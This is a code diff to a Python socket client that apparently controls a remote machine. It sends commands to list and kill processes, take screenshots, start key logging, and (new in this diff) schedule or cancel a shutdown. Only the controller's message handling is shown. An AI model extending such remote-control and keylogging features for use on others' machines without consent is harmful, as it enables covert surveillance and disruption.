@@ -14,7 +14,8 @@ STOP_LISTING = "STOP LISTING"
 KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
 KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
 KEY_LOGGING ="KEY LOG"
-
+SHUTDOWN = "SHUTDOWN"
+CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"
 
 
 
@@ -38,54 +39,66 @@ def Execute():
         send(msg)
         if msg == RUNNING_PROCESS:
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
             while True:
                 receiving_msg = client.recv(1024).decode(FORMAT)
                 if receiving_msg == STOP_LISTING:
                     break
                 print(receiving_msg)
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER]: " + receiving_msg)
         elif msg == TAKE_SCREEN_SHOT:
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
 
         elif msg == DISCONNECT_MESSAGE:
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
             break
         elif msg == KILL_PROCESS_VIA_PID:                        
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
             pid = input()
             client.send(pid.encode(FORMAT))
 
 
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
            
 
         elif msg == KILL_PROCESS_VIA_NAME:                        
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
             p_name = input()
             client.send(p_name.encode(FORMAT))
 
 
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
            
         elif msg == KEY_LOGGING:
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
 
+        elif msg == SHUTDOWN:
+            receiving_msg = client.recv(1024).decode(FORMAT)
+            print(f"[SERVER] " + receiving_msg)
+            sec = input()
+            client.send(sec.encode(FORMAT))
+            receiving_msg = client.recv(1024).decode(FORMAT)
+            print(f"[SERVER] " + receiving_msg)
+
+        elif msg == CANCEL_SHUTDOWN:
+            receiving_msg = client.recv(1024).decode(FORMAT)
+            print(f"[SERVER] " + receiving_msg)
+           
         else:
             receiving_msg = client.recv(1024).decode(FORMAT)
-            print(receiving_msg)
+            print(f"[SERVER] " + receiving_msg)
         
 
         
